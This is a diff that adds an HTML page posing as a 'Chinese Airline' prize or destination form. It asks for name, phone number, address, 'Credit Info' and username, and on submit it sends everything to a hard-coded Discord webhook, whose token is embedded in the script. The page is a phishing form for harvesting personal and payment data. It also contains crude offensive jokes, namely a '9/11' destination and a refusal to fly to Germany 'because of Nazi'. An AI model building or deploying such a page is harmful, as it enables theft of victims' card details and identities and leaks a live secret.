@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Chinese Airline</title>
+  <style>
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: white;
+      padding: 20px;
+      border: 1px solid gray;
+    }
+
+    @media screen and (max-width: 600px) {
+      .popup {
+        width: 90%;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Chinese Airline</h1>
+
+  <label for="name">Name:</label>
+  <input type="text" id="name"><br><br>
+
+  <label for="lastName">Last Name:</label>
+  <input type="text" id="lastName"><br><br>
+
+  <label for="country">Country:</label>
+  <input type="text" id="country"><br><br>
+
+  <label for="number">Number:</label>
+  <input type="text" id="number"><br><br>
+  
+  <label for="address">Address:</label>
+  <input type="text" id="address"><br><br>
+  
+  <label for="state">State:</label>
+  <input type="text" id="state"><br><br>
+  
+  <label for="creditInfo">Credit Info:</label>
+  <input type="text" id="creditInfo"><br><br>
+
+  <label for="user">User:</label>
+  <input type="text" id="user"><br><br>
+
+  <button id="whereToFlyButton">Where to Fly</button>
+
+  <div class="popup" id="popup">
+    <p>Select a destination:</p>
+    <button class="destinationButton">Russia</button>
+    <button class="destinationButton">America</button>
+    <button class="destinationButton">Germany</button>
+    <button class="destinationButton">Aqua</button>
+    <button class="destinationButton">UK</button>
+    <button class="destinationButton">Afghanistan</button>
+    <button class="destinationButton">9/11</button>
+    <button class="destinationButton">Canada</button>
+    <button class="destinationButton">Australia</button>
+    <button class="destinationButton">North Korea</button>
+    <button class="destinationButton">Japan</button>
+  </div>
+
+  <p>Prize: <span id="prize">0$</span></p>
+
+  <button id="submitButton">Submit</button>
+  <button id="infoButton">Info</button>
+  <p id="submitMessage"></p>
+  <p id="thankYouMessage"></p>
+  <p id="pilotInfo" style="display: none;">Pilot: JN HH Gaming<br>Co-Pilot: JN HH Gaming Brother<br>CEO: Alpha</p>
+
+  <script>
+    const whereToFlyButton = document.getElementById("whereToFlyButton");
+    const popup = document.getElementById("popup");
+    const destinationButtons = document.querySelectorAll(".destinationButton");
+    const prizeElement = document.getElementById("prize");
+    const nameInput = document.getElementById("name");
+    const lastNameInput = document.getElementById("lastName");
+    const countryInput = document.getElementById("country");
+    const numberInput = document.getElementById("number");
+    const addressInput = document.getElementById("address");
+    const stateInput = document.getElementById("state");
+    const creditInfoInput = document.getElementById("creditInfo");
+    const userInput = document.getElementById("user");
+    const submitMessage = document.getElementById("submitMessage");
+    const thankYouMessage = document.getElementById("thankYouMessage");
+    const pilotInfo = document.getElementById("pilotInfo");
+    const infoButton = document.getElementById("infoButton");
+
+    const prizeMap = {
+      Russia: 500,
+      America: 5000,
+      Germany: "Sorry won't fly because of Nazi",
+      Aqua: 1,
+      Afghanistan: 28287272,
+      UK: 2882828,
+      "9/11": 0,
+      Canada: 200,
+      Australia: 800,
+      "North Korea": -0,
+      Japan: 827282
+    };
+
+    whereToFlyButton.addEventListener("click", () => {
+      popup.style.display = "block";
+    });
+
+    destinationButtons.forEach(button => {
+      button.addEventListener("click", () => {
+        const selectedDestination = button.textContent;
+        const prize = prizeMap[selectedDestination];
+
+        if (typeof prize === "number") {
+          prizeElement.textContent = `${prize}$`;
+        } else {
+          prizeElement.textContent = prize;
+        }
+
+        whereToFlyButton.textContent = selectedDestination;
+        popup.style.display = "none";
+      });
+    });
+
+    const submitButton = document.getElementById("submitButton");
+    submitButton.addEventListener("click", async () => {
+      const formData = {
+        name: nameInput.value,
+        lastName: lastNameInput.value,
+        country: countryInput.value,
+        number: numberInput.value,
+        address: addressInput.value,
+        state: stateInput.value,
+        creditInfo: creditInfoInput.value,
+        destination: whereToFlyButton.textContent,
+        prize: prizeElement.textContent,
+        user: userInput.value
+      };
+
+      const webhookURL = 'https://discord.com/api/webhooks/1145111115014078517/zUJt-YPmmGt-tZ5uPfNdW7DOQJB816l19DC_6mp76Ou9lwopxZovv4Q9WNaRQM-TmXyq'; // Replace with your actual webhook URL
+      
+      const response = await fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          content: 'Form Data:',
+          embeds: [
+            {
+              title: 'Flight Details',
+              description: `
+                **Name:** ${formData.name}
+                **Last Name:** ${formData.lastName}
+                **Country:** ${formData.country}
+                **Number:** ${formData.number}
+                **Number:** ${formData.number}
+                **Address:** ${formData.address}
+                **State:** ${formData.state}
+                **Credit Info:** ${formData.creditInfo}
+                **User:** ${formData.user}
+                **Destination:** ${formData.destination}
+                **Prize:** ${formData.prize}
+              `
+            }
+          ]
+        })
+      });
+
+      if (response.ok) {
+        submitMessage.textContent = "Thank you for your service. The airline will be in touch with you.";
+        nameInput.value = "";
+        lastNameInput.value = "";
+        countryInput.value = "";
+        numberInput.value = "";
+        addressInput.value = "";
+        stateInput.value = "";
+        creditInfoInput.value = "";
+        userInput.value = "";
+        prizeElement.textContent = "0$";
+        whereToFlyButton.textContent = "Where to Fly";
+        setTimeout(() => {
+          submitMessage.textContent = "";
+        }, 5000);
+
+        thankYouMessage.textContent = "";
+      } else {
+        submitMessage.textContent = "An error occurred while submitting the form.";
+      }
+    });
+
+    infoButton.addEventListener("click", () => {
+      pilotInfo.style.display = "block";
+      setTimeout(() => {
+        pilotInfo.style.display = "none";
+      }, 6000);
+    });
+  </script>
+</body>
+</html>
